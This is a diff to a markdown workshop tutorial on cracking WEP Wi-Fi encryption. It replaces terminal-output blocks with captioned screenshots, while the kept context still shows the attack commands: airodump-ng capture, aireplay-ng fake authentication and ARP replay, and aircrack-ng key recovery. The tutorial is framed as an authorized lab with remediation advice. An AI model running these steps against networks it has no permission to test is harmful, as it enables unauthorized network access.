@@ -114,16 +114,12 @@ airodump-ng wlan0mon
 
 This lists every nearby network. Look at the **ENC** column and find your target running **WEP**:
 
-```
- CH  6 ][ Elapsed: 12 s ][ 2026-06-19 18:40
-
- BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
- AA:BB:CC:DD:EE:FF  -38      120       482   12   6  54   WEP  WEP        WEP-LAB
- 11:22:33:44:55:66  -67       95         3    0  11  130  WPA2 CCMP   PSK  HomeNet
-
- BSSID              STATION            PWR   Rate    Lost   Frames  Probe
- AA:BB:CC:DD:EE:FF  99:88:77:66:55:44  -41   54e-54     0      318
-```
+<p style="text-align:center;">
+  <img src="WEP_Files/airodump_scan.jpg" />
+</p>
+<p style="text-align:center;">
+  <em>airodump-ng listing nearby networks; the highlighted target shows <strong>WEP</strong> in the ENC column (source: ComputerWeekly).</em>
+</p>
 
 Identify your target network and confirm the **ENC** column shows **WEP**. Then note:
 
@@ -139,16 +135,16 @@ Now focus the capture on the single target network and write the captured frames
 airodump-ng -c <channel> --bssid <BSSID> -w wep_capture wlan0mon
 ```
 
-Replace `<channel>` and `<BSSID>` with the values you noted. Watch the **`#Data`** column — it counts the data frames (and therefore the IVs) captured. As a rough guide, you'll want on the order of **tens of thousands** of IVs (often ~20,000–40,000 for a 64-bit key, more for 128-bit) before cracking succeeds.
+Replace `<channel>` and `<BSSID>` with the values you noted (here, capturing the `ConnectMe` network to a file called `ConnectMeCrack`):
 
-```
- CH  6 ][ Elapsed: 2 mins ][ 2026-06-19 18:42
+<p style="text-align:center;">
+  <img src="WEP_Files/capture_ivs.jpg" />
+</p>
+<p style="text-align:center;">
+  <em>Focusing the capture on a single WEP target and writing it to a file (source: ComputerWeekly).</em>
+</p>
 
- BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
- AA:BB:CC:DD:EE:FF  -38 100     1430    18452  312   6  54   WEP  WEP        WEP-LAB
-```
-
-Leave this command running. The higher `#Data` climbs, the better.
+Watch the **`#Data`** column — it counts the data frames (and therefore the IVs) captured. As a rough guide, you'll want on the order of **tens of thousands** of IVs (often ~20,000–40,000 for a 64-bit key, more for 128-bit) before cracking succeeds. Leave this command running; the higher `#Data` climbs, the better.
 
 ## Generating Traffic
 
@@ -164,18 +160,25 @@ On an idle network, IVs accumulate slowly. Because WEP offers no replay protecti
 
    `<our-MAC>` is the MAC address of `wlan0mon`. On success you'll see `Association successful :-)`.
 
+   <p style="text-align:center;">
+     <img src="WEP_Files/fakeauth.jpg" />
+   </p>
+   <p style="text-align:center;">
+     <em>Fake authentication succeeding against the access point (source: ComputerWeekly).</em>
+   </p>
+
 2. **ARP request replay** — capture a legitimate ARP request and replay it endlessly. Each replay forces the AP to broadcast a fresh response with a new IV:
 
    ```bash
    aireplay-ng -3 -b <BSSID> -h <our-MAC> wlan0mon
    ```
 
-   ```
-   Saving ARP requests in replay_arp-0619-184230.cap
-   Read 184523 packets (got 9182 ARP requests and 21044 ACKs), sent 18960 packets...(500 pps)
-   ```
-
-   As this runs, the `#Data` counter in your `airodump-ng` window should climb rapidly.
+   <p style="text-align:center;">
+     <img src="WEP_Files/arpreplay.jpg" />
+   </p>
+   <p style="text-align:center;">
+     <em>ARP-request replay generating thousands of packets; as this runs, the <code>#Data</code> counter in your airodump-ng window climbs rapidly (source: ComputerWeekly).</em>
+   </p>
 
 ## Cracking the Key
 
@@ -187,23 +190,14 @@ aircrack-ng wep_capture-01.cap
 
 Note the contrast with WPA/WPA2: **no wordlist is required.** WEP cracking is a statistical attack (FMS/KoreK/PTW) on the captured IVs, not a dictionary or brute-force attack on a passphrase. When enough IVs have been collected, the key is recovered:
 
-```
-                                 Aircrack-ng 1.7
+<p style="text-align:center;">
+  <img src="WEP_Files/key_found.jpg" />
+</p>
+<p style="text-align:center;">
+  <em>aircrack-ng recovering the WEP key from ~22,000 captured IVs in seconds (source: ComputerWeekly).</em>
+</p>
 
-      [00:00:04] Tested 1294 keys (got 24281 IVs)
-
-   KB    depth   byte(vote)
-    0    0/  1   1F(36096) 4E(35584) ...
-    1    0/  1   1F(38400) 36(36096) ...
-    2    0/  2   1F(35840) D9(33792) ...
-    3    0/  1   1F(39936) 4F(35072) ...
-    4    0/  1   1F(40448) E1(34560) ...
-
-           KEY FOUND! [ 1F:1F:1F:1F:1F ]
-      Decrypted correctly: 100%
-```
-
-The value in brackets is the recovered WEP key. Notice it took only seconds once enough IVs were available — that is the whole point of this workshop.
+The value in brackets after `KEY FOUND!` is the recovered WEP key. Notice it took only seconds once enough IVs were available — that is the whole point of this workshop.
 
 # Remediation
 
@@ -262,3 +256,4 @@ Ethical hacking is a valuable skill when used responsibly and with explicit auth
 - Wi-Fi Alliance — WPA/WPA2/WPA3 security: https://www.wi-fi.org/discover-wi-fi/security
 - WEP encryption diagram: Wikimedia Commons — *Wep-crypt-alt.svg* (https://commons.wikimedia.org/wiki/File:Wep-crypt-alt.svg)
 - airmon-ng screenshot: techofide.com — *How to use Aircrack-ng* (https://techofide.com/blogs/how-to-use-aircrack-ng-aircrack-ng-tutorial-practical-demonstration/)
+- WEP crack screenshots (airodump-ng, aireplay-ng, aircrack-ng): ComputerWeekly — *Step-by-step aircrack tutorial for Wi-Fi penetration testing* (https://www.computerweekly.com/tip/Step-by-step-aircrack-tutorial-for-Wi-Fi-penetration-testing)
